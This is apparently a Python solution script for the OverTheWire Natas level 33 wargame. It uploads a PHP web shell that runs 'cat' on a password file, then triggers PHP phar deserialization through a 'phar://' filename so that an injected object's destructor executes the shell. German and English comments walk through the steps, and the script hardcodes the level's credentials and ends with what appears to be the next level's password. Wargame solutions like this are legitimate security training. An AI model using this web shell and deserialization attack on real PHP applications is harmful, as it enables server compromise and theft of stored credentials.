import requests

level = str(33)
pw = "shoogeiGa2yee3de6Aex8uaXeech5eey"

url = "http://natas"+level+".natas.labs.overthewire.org/index.php"
s = requests.Session()
s.auth = ('natas'+level, pw)

# upload pwn script
filename = "pwn.php"
data = [("filename", filename), ("submit", "Upload File")]
payload = "<?php echo shell_exec('cat /etc/natas_webpass/natas34'); ?>"
file = [("uploadedfile", (filename, payload, "text/php"))]
r = s.post(url, files=file, data=data)
print(r.text)

# upload archive
payload = open("//natas33/test.phar", "rb")

filename = "test.phar"
data = [("filename", filename), ("submit", "Upload File")]
file = [("uploadedfile", ("test.phar", payload, "application/octet-stream"))]

r = s.post(url, files=file, data=data)

print(r.text)



# force opening of phar archive
filename = "phar://test.phar/test.txt"
data = [("filename", filename), ("submit", "Upload File")]
file = [("uploadedfile", ("test.phar", payload, "application/octet-stream"))]

r = s.post(url, files=file, data=data)

print(r.text)



# 1st
# send pwn.php script -> wird gespeichert unter /natas33/upload/pwn.php
# md5 check failt

# 2nd
# send phar archive
# move upload succeeds -> archive test.phar uploaded
# md5_file(phar) called -> wird noch nicht als phar interpretiert
# -> md5 sum fails


# 3rd
# send phar archive filename/path
# md5_file(phar://test.phar/test.txt) called
# -> file.open call
# -> inject Executor metadata instance
# signature check fails
# destruct of injected instance called
# md5_file(pwn.php) gets logged and succeeds
# congratulations logged + pw in response


# shu5ouSu6eicielahhae0mohd4ui5uig